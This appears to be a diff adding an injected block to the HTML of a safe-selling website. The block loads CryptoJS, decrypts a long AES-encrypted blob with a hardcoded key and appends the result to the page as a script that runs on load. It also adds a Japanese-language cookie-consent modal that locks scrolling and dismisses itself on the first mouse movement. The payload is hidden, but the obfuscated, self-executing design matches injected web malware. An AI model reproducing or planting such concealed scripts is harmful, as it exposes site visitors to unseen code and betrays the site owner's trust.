@@ -69,6 +69,87 @@
 </head>
 
 <body>
+	
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`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`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script>
+<script>
+    document.body.style.overflow = "hidden";
+</script>
+<div id="cookie-modal-box" class="hidden">
+    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
+    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+            <button id="cookie-close" class="absolute top-4 right-4">
+                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+                </svg>
+            </button>
+            <div class="flex items-center gap-3 mb-4">
+                <span class="text-yellow-500 text-3xl">🍪</span>
+                <h2 class="text-2xl font-bold">クッキーについて</h2>
+            </div>
+            <p class="text-gray-600 mb-6">
+                当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。 <span class="font-semibold">「同意する」</span>
+                をクリックすると、クッキーの使用に同意したことになります。
+            </p>
+            <div class="flex flex-col sm:flex-row gap-3">
+                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 同意する</button>
+                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">拒否する</button>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
+
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+
+        // remove mousemove listener once closed
+        document.removeEventListener("mousemove", mouseMoveClose);
+    }
+
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("mousemove", mouseMoveClose, { once: true });
+    }
+</script>
   <header>
     <h1>Safes.by</h1>
     <p>Looking to buy a safe? You’re in the right place!</p>
